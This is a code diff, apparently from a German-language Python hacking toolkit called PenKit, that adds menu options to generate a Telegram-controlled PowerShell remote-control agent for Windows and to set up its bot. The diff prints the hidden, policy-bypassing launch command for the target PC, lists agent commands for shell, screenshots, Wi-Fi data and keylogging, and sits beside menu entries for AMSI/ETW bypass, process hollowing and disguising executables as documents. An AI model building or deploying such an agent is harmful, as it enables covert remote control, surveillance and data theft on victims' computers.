@@ -859,6 +859,8 @@ async def menu_c2():
     menu_item(" 4", "🔀  AMSI + ETW kombiniert",           "🔴", "Beide Bypasses + ScriptBlock Logging in einem Befehl")
     menu_item(" 5", "💉  Process Hollowing",               "⛔", "Shellcode in svchost.exe einschleusen (RAM only)")
     menu_item(" 6", "🎭  Als PDF/Foto/Word tarnen",        "⛔", "EXE mit echtem Icon, öffnet Decoy-Datei zur Tarnung")
+    menu_item(" 7", "📱  Telegram C2 Agent generieren",   "⛔", "PS1 das Befehle via Telegram empfängt + ausführt")
+    menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
     print()
     menu_item(" 0", "← Zurück", "")
     print()
@@ -1082,6 +1084,136 @@ async def menu_c2():
             from tools.c2.disguise import build_disguised_exe
             async for line in build_disguised_exe(ps1_path, dtype, decoy, out_dir):
                 print_output_line(line)
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "7":
+        banner()
+        section("📱  TELEGRAM C2 AGENT", "Windows PS1 das via Telegram gesteuert wird")
+        info_box([
+            "Der Agent läuft auf dem Ziel-Windows als PowerShell-Skript.",
+            "Er fragt alle N Sekunden Telegram nach Befehlen — kein eingehender Port nötig.",
+            "",
+            "Was du brauchst:",
+            "  1. Telegram Bot Token  → @BotFather auf Telegram → /newbot",
+            "  2. Deine Chat-ID       → @userinfobot auf Telegram anschreiben",
+            "",
+            "Danach kannst du dem Bot direkt Befehle schicken:",
+            "  !shell whoami   !screenshot   !sysinfo   !wifi   !keylog start   !help",
+        ])
+        print()
+
+        # Gespeicherte Config laden falls vorhanden
+        from tools.c2.telegram_bot import load_config, save_config
+        saved = load_config()
+        if saved:
+            print(f"  {G}[*] Gespeicherte Config gefunden{R}  (Token: ...{saved[0][-8:]}  Chat: {saved[1]})")
+            use_saved = prompt("Gespeicherte Config verwenden? [j/n]  (Enter = j)").lower()
+            if use_saved not in ("n", "nein", "no"):
+                token, chat_id = saved
+            else:
+                token = chat_id = ""
+        else:
+            token = chat_id = ""
+
+        if not token:
+            info_box([
+                "Bot-Token = langer String den @BotFather gibt, z.B.:",
+                "  1234567890:ABCdefGHijklMNOpqrSTUvwxYZ-abc123",
+            ])
+            token = prompt("Bot-Token")
+            if not token:
+                wait_key(); return
+
+        if not chat_id:
+            info_box([
+                "Chat-ID = deine persönliche Telegram-ID, z.B. 123456789",
+                "  → Schreibe @userinfobot auf Telegram, er antwortet mit deiner ID",
+                "  → ODER nutze Option 8 (Bot Setup) um sie automatisch zu finden",
+            ])
+            chat_id = prompt("Chat-ID  (deine Telegram-Nutzer-ID)")
+            if not chat_id:
+                wait_key(); return
+
+        try:
+            interval = int(prompt("Polling-Intervall in Sekunden  (Enter = 10)") or "10")
+        except ValueError:
+            interval = 10
+
+        save_config(token, chat_id)
+
+        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+            print(f"  {Y}[!] Abgebrochen.{R}")
+            wait_key()
+            return
+
+        print()
+        try:
+            from tools.c2.telegram_agent import generate as ag_gen
+            ps1_code = ag_gen(token, chat_id, interval)
+            out_path = f"/tmp/penkit_agent_{chat_id}.ps1"
+            with open(out_path, "w") as f:
+                f.write(ps1_code)
+            print(f"  {G}[+] Agent gespeichert: {out_path}{R}")
+            print(f"  {G}[+] Größe: {len(ps1_code)} Zeichen{R}")
+            print()
+            print(f"  {C}Auf dem Ziel-PC ausführen:{R}")
+            print(f"  {W}  powershell -ep bypass -w hidden -File agent.ps1{R}")
+            print()
+            print(f"  {DIM}Agent fragt alle {interval}s nach Befehlen.{R}")
+            print(f"  {DIM}Schreibe dem Bot auf Telegram: !help{R}")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "8":
+        banner()
+        section("🤖  TELEGRAM BOT SETUP", "Token verifizieren + Chat-ID finden")
+        info_box([
+            "Schritt 1: Bot erstellen",
+            "  → Öffne Telegram → suche @BotFather → schreibe /newbot",
+            "  → Gib dem Bot einen Namen (z.B. 'MyHelper') und Username (z.B. 'myhelper_bot')",
+            "  → BotFather gibt dir den Token (langer String mit :)",
+            "",
+            "Schritt 2: Chat-ID finden",
+            "  → Schreibe deinem neuen Bot eine beliebige Nachricht",
+            "  → PenKit findet die Chat-ID automatisch",
+        ])
+        print()
+        token = prompt("Bot-Token")
+        if not token:
+            wait_key()
+            return
+        print()
+        try:
+            from tools.c2.telegram_bot import setup_bot, get_chat_id, BotConfig, save_config
+            # Erst Token verifizieren
+            async for line in setup_bot(BotConfig(token=token, chat_id="")):
+                print_output_line(line)
+                if "ungültig" in line.lower():
+                    wait_key()
+                    return
+            print()
+            print(f"  {Y}[*] Schreibe jetzt dem Bot eine Nachricht auf Telegram (z.B. 'hallo'){R}")
+            print(f"  {DIM}  Dann Enter drücken...{R}")
+            input()
+            print()
+            found_id = ""
+            async for line in get_chat_id(token):
+                print_output_line(line)
+                if "Chat-ID gefunden:" in line:
+                    import re
+                    m = re.search(r'Chat-ID gefunden:\s*(-?\d+)', line)
+                    if m:
+                        found_id = m.group(1)
+            if found_id:
+                save_config(token, found_id)
+                print(f"\n  {G}[+] Config gespeichert!{R}")
+                print(f"  {C}Token  : {token[:20]}...{R}")
+                print(f"  {C}Chat-ID: {found_id}{R}")
+                print(f"\n  {DIM}Jetzt C2 → Agent generieren (Option 7){R}")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
         wait_key()
